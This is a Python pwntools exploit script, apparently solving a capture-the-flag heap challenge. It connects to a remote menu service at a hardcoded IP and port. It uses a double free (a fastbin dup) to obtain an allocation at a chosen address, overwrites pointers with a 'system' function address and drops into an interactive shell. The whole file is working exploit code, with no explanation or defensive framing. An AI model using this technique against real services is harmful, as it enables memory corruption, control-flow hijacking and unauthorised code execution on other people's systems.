#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4000
host = '39.96.9.148'
port = 9999

r = remote(host, port)

def add(idx, size, content):
    r.recvuntil('2 delete')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)


def free(idx):
    r.recvuntil('2 delete')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))
system = 0x400946


add(5, 0x40, 'a'*0x38 + p64(system))

add(10, 0x38, 'a') # 9
add(11, 0x38, 'a') # 10
free(10) # 11
free(11) # 12
free(10) # 13
add(11, 0x38, p64(0x60207a)) # 14
add(11, 0x38, 'a') # 15
add(11, 0x38, 'a') # 16
add(0, 0x38, 'a'*0xe + p64(0x00602f00) + p64(0x602010)) # 17


r.interactive()
